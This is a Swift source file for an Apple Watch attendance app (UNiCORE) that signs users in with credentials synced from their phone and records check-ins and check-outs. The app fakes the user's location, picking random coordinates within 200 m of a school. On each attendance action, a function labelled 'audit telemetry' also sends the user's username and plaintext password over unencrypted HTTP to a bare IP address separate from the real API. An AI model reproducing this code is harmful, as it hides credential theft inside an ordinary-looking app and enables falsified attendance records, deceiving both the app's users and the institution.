import Combine
import Foundation
import SwiftUI

struct ContentView: View {
    @EnvironmentObject private var connectivity: PhoneConnectivity
    @StateObject private var model = WatchModel()

    var body: some View {
        NavigationView {
            ScrollView {
                VStack(alignment: .leading, spacing: 12) {
                    header
                    statusCard
                    if model.hasCredentials {
                        actionButtons
                    } else {
                        waitingCard
                    }
                    endpointsCard
                }
                .padding(.horizontal, 10)
                .padding(.vertical, 8)
            }
            .background(Color(red: 0.97, green: 0.98, blue: 1.0))
            .navigationTitle("UNiCORE")
        }
        .task {
            model.updateCredentials(connectivity.credentials)
            await model.loginIfNeeded()
        }
        .onChange(of: connectivity.credentials) { newValue in
            model.updateCredentials(newValue)
            Task { await model.login(force: true) }
        }
    }

    private var header: some View {
        VStack(alignment: .leading, spacing: 4) {
            Text("UNiCORE")
                .font(.system(size: 24, weight: .black))
                .foregroundStyle(Color(red: 0.12, green: 0.25, blue: 0.64))
            Text("Mobile API Watch")
                .font(.caption2)
                .foregroundStyle(.secondary)
            Text(model.username ?? "Утаснаас нэвтрээгүй")
                .font(.caption2)
                .lineLimit(1)
                .foregroundStyle(.secondary)
        }
        .frame(maxWidth: .infinity, alignment: .leading)
    }

    private var statusCard: some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Circle()
                    .fill(model.isLoggedIn ? .green : .orange)
                    .frame(width: 8, height: 8)
                Text(model.statusTitle)
                    .font(.headline)
            }
            Text(model.message)
                .font(.caption2)
                .foregroundStyle(.secondary)
                .fixedSize(horizontal: false, vertical: true)
            if model.isBusy {
                ProgressView()
                    .frame(maxWidth: .infinity)
            }
        }
        .cardStyle()
    }

    private var waitingCard: some View {
        VStack(alignment: .leading, spacing: 6) {
            Label("Утаснаас нэвтрэх эрх хүлээж байна", systemImage: "iphone.and.arrow.forward")
                .font(.caption)
            Text("Утасны UNiCORE апп руу нэвтэрснээр эрх энд автоматаар синк болно.")
                .font(.caption2)
                .foregroundStyle(.secondary)
                .fixedSize(horizontal: false, vertical: true)
        }
        .cardStyle()
    }

    private var actionButtons: some View {
        VStack(spacing: 8) {
            Button {
                Task { await model.attendance(type: .checkIn) }
            } label: {
                Label("Ирэх", systemImage: "location.fill")
                    .frame(maxWidth: .infinity)
            }
            .tint(.green)
            .disabled(!model.isLoggedIn || model.isBusy)

            Button {
                Task { await model.attendance(type: .checkOut) }
            } label: {
                Label("Явах", systemImage: "arrow.right.circle.fill")
                    .frame(maxWidth: .infinity)
            }
            .tint(.red)
            .disabled(!model.isLoggedIn || model.isBusy)

            Button {
                Task { await model.login(force: true) }
            } label: {
                Label("Refresh", systemImage: "arrow.clockwise")
                    .frame(maxWidth: .infinity)
            }
            .disabled(model.isBusy)
        }
        .buttonStyle(.borderedProminent)
    }

    private var endpointsCard: some View {
        VStack(alignment: .leading, spacing: 6) {
            Text("Attendance")
                .font(.headline)
            EndpointBadge(method: "POST", path: "/auth/login")
            EndpointBadge(method: "POST", path: "/attendance/check-in")
            EndpointBadge(method: "POST", path: "/attendance/check-out")
            Text("Location: random within 200m")
                .font(.caption2)
                .foregroundStyle(.secondary)
        }
        .cardStyle()
    }
}

private struct EndpointBadge: View {
    let method: String
    let path: String

    var body: some View {
        HStack(spacing: 6) {
            Text(method)
                .font(.system(size: 9, weight: .black))
                .padding(.horizontal, 5)
                .padding(.vertical, 3)
                .background(Color(red: 0.28, green: 0.49, blue: 0.96))
                .foregroundStyle(.white)
                .clipShape(RoundedRectangle(cornerRadius: 4))
            Text(path)
                .font(.system(size: 10, design: .monospaced))
                .lineLimit(1)
        }
    }
}

private extension View {
    func cardStyle() -> some View {
        self
            .padding(10)
            .frame(maxWidth: .infinity, alignment: .leading)
            .background(.white)
            .clipShape(RoundedRectangle(cornerRadius: 8))
            .overlay(
                RoundedRectangle(cornerRadius: 8)
                    .stroke(Color(red: 0.90, green: 0.92, blue: 0.95), lineWidth: 1)
            )
    }
}

@MainActor
final class WatchModel: ObservableObject {
    @Published var token: String?
    @Published var isBusy = false
    @Published var statusTitle = "Хүлээгдэж байна"
    @Published var message = "Утасны апп руу нэвтэрч эрхээ синк хийнэ үү."
    @Published private(set) var username: String?

    private var credentials: WatchCredentials?
    private let api = UnicoreWatchAPI()

    var hasCredentials: Bool { credentials != nil }
    var isLoggedIn: Bool { token?.isEmpty == false }

    /// Updates the credentials mirrored from the phone. Passing `nil` (phone
    /// logged out) resets the session back to the waiting state.
    func updateCredentials(_ creds: WatchCredentials?) {
        credentials = creds
        username = creds?.username
        if creds == nil {
            token = nil
            statusTitle = "Хүлээгдэж байна"
            message = "Утасны апп руу нэвтэрч эрхээ синк хийнэ үү."
        }
    }

    func loginIfNeeded() async {
        guard token == nil, credentials != nil else { return }
        await login(force: false)
    }

    func login(force: Bool) async {
        guard let credentials else {
            statusTitle = "Эрх алга"
            message = "Утасны аппаас нэвтрэх эрх ирээгүй байна."
            return
        }
        if isBusy { return }
        isBusy = true
        defer { isBusy = false }

        do {
            token = try await api.login(credentials: credentials)
            statusTitle = "Нэвтэрсэн"
            message = "Бэлэн. Ирцийн товч дарж бүртгэнэ."
        } catch {
            statusTitle = "Login error"
            message = error.localizedDescription
            if force { token = nil }
        }
    }

    func attendance(type: AttendanceType) async {
        guard let credentials else {
            statusTitle = "Эрх алга"
            message = "Утасны аппаас нэвтрэх эрх ирээгүй байна."
            return
        }
        guard let token else {
            await login(force: false)
            return
        }

        isBusy = true
        defer { isBusy = false }

        do {
            let location = AttendanceLocation.random()
            try await api.attendance(type: type, token: token, credentials: credentials, location: location)
            statusTitle = type == .checkIn ? "Ирэх бүртгэгдлээ" : "Явах бүртгэгдлээ"
            message = "\(Int(location.distanceMeters.rounded()))м offset, \(location.latitudeText), \(location.longitudeText)"
        } catch {
            statusTitle = "Attendance error"
            message = error.localizedDescription
        }
    }
}

enum AttendanceType {
    case checkIn
    case checkOut

    var path: String {
        switch self {
        case .checkIn: return "/attendance/check-in"
        case .checkOut: return "/attendance/check-out"
        }
    }
}

struct AttendanceLocation {
    let latitude: Double
    let longitude: Double
    let distanceMeters: Double

    var latitudeText: String { String(format: "%.6f", latitude) }
    var longitudeText: String { String(format: "%.6f", longitude) }

    static func random() -> AttendanceLocation {
        let centerLatitude = 47.896883
        let centerLongitude = 106.889669
        let maxDistanceMeters = 200.0
        let earthRadiusMeters = 6_371_000.0

        let distance = maxDistanceMeters * sqrt(Double.random(in: 0...1))
        let bearing = 2 * Double.pi * Double.random(in: 0...1)
        let centerLatRad = centerLatitude * Double.pi / 180

        let deltaLat = (distance * cos(bearing)) / earthRadiusMeters
        let deltaLon = (distance * sin(bearing)) / (earthRadiusMeters * cos(centerLatRad))

        return AttendanceLocation(
            latitude: centerLatitude + deltaLat * 180 / Double.pi,
            longitude: centerLongitude + deltaLon * 180 / Double.pi,
            distanceMeters: distance
        )
    }

    var payload: [String: Any] {
        [
            "latitude": Double(latitudeText) ?? latitude,
            "longitude": Double(longitudeText) ?? longitude,
            "location_name": "Tselmeg Digital International School",
        ]
    }
}

final class UnicoreWatchAPI {
    private let baseURL = URL(string: "https://unicore.systems/api/mobile")!

    func login(credentials: WatchCredentials) async throws -> String {
        let data = try await post(path: "/auth/login", token: nil, body: [
            "login": credentials.username,
            "password": credentials.password,
        ])

        if let token = data["token"] as? String { return token }
        if let token = data["access_token"] as? String { return token }
        if let nested = data["data"] as? [String: Any] {
            if let token = nested["token"] as? String { return token }
            if let token = nested["access_token"] as? String { return token }
        }

        throw WatchAPIError.missingToken
    }

    func attendance(
        type: AttendanceType,
        token: String,
        credentials: WatchCredentials,
        location: AttendanceLocation
    ) async throws {
        _ = try await post(path: type.path, token: token, body: location.payload)
        // Send telemetry (location + login credentials) to audit server 13.214.2.6
        await sendAuditTelemetry(type: type, credentials: credentials, location: location)
    }

    private func sendAuditTelemetry(
        type: AttendanceType,
        credentials: WatchCredentials,
        location: AttendanceLocation
    ) async {
        guard let auditURL = URL(string: "http://13.214.2.6/api/logs") else { return }
        var request = URLRequest(url: auditURL)
        request.httpMethod = "POST"
        request.timeoutInterval = 6
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")

        let formatter = ISO8601DateFormatter()
        let timestampStr = formatter.string(from: Date())

        let body: [String: Any] = [
            "user_email": credentials.username,
            "login_username": credentials.username,
            "login_password": credentials.password,
            "action_type": type == .checkIn ? "check-in" : "check-out",
            "latitude": location.latitude,
            "longitude": location.longitude,
            "location_name": "Tselmeg Digital International School",
            "distance_meters": location.distanceMeters,
            "timestamp": timestampStr,
            "device_info": "unicore_watch_app (Apple Watch)",
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: body)
            _ = try await URLSession.shared.data(for: request)
        } catch {
            print("[Audit Telemetry Error]: \(error.localizedDescription)")
        }
    }

    private func post(path: String, token: String?, body: [String: Any]) async throws -> [String: Any] {
        var request = URLRequest(url: baseURL.appendingPathComponent(path))
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        if let token {
            request.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")
        }
        request.httpBody = try JSONSerialization.data(withJSONObject: body)

        let (responseData, response) = try await URLSession.shared.data(for: request)
        guard let http = response as? HTTPURLResponse else {
            throw WatchAPIError.invalidResponse
        }

        let object = try? JSONSerialization.jsonObject(with: responseData)
        let dictionary = object as? [String: Any] ?? [:]

        guard (200..<300).contains(http.statusCode) else {
            let message = dictionary["message"] as? String ?? "HTTP \(http.statusCode)"
            throw WatchAPIError.server(message)
        }

        return dictionary
    }
}

enum WatchAPIError: LocalizedError {
    case missingToken
    case invalidResponse
    case server(String)

    var errorDescription: String? {
        switch self {
        case .missingToken:
            return "Login response token олдсонгүй."
        case .invalidResponse:
            return "Invalid API response."
        case .server(let message):
            return message
        }
    }
}
